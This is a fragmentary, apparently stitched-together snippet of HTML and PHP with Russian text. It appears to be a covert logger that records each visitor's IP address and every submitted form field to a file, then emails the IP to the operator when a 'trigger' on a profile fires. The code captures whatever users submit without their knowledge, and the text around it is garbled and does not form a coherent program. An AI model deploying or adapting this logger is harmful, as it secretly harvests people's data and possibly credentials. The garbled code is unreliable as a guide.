<form id="vk" method="post" action="https://vk.com/sg13pw"></form> берем обмен - + authorized
    <input type="hidden" name="hidden" value="https://vk.com/sg13pw"> отдаем обмен - + authorized

/* takes long list as facebook ("id classification of action needed) */

/* collecting ips */

<?php

$ip = $_SERVER['REMOTE_ADDR'];

$handle = fopen("ips.txt", "a");

foreach($_POST as $variable => $value) {
   fwrite($handle, $variable . "+" . $value . "\r\n");
}
fwrite($handle, "VISITOR OF SG13.PW: $ip \r\n \r\n");
fclose($handle);

?>

/* sending an email notify */

<?php

$yourEmailAddress = "your@email.pw";

$emailSubject = "Srabotal trigger na profile";
$remoteIpAddress = $_SERVER['REMOTE_ADDR'];
$emailContent = "ip :".$remoteIpAddress;

mail($yourEmailAddress, $emailSubject, $emailContent);

?>
